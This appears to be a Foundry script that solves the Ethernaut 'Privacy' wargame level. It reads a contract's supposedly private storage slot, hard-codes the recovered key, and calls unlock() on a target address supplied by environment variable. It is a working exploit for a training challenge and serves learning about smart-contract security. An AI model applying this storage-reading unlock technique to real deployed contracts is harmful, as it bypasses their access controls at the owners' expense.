// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface IPrivacy {
    function unlock(bytes16 _key) external;
    function locked() external returns (bool);
}
// let contractAddress = '';
// const password = await web3.eth.getStorageAt(contractAddress, '5');
// console.log('Current password # is ', password);
//forge script  --rpc-url sepolia --account metamask  Cracked12_PrivacyScript --broadcast
contract Cracked12_PrivacyScript is Script {
    address ethernaut_contracts;
    bytes32 key;

    function setUp() public {
        ethernaut_contracts = vm.parseAddress(vm.envString("Privacy_address"));
        key = 0x466501f78c0d6895a82eb1e1348e3971f9dca985c68f8270988b7bc9fe29517f;
    }

    function run() public {
        vm.startBroadcast();
        console.log("bytes16 is ", uint128(bytes16(key)));
        IPrivacy(ethernaut_contracts).unlock(bytes16(key));
        require(!IPrivacy(ethernaut_contracts).locked(), "false");
        vm.stopBroadcast();
    }
}
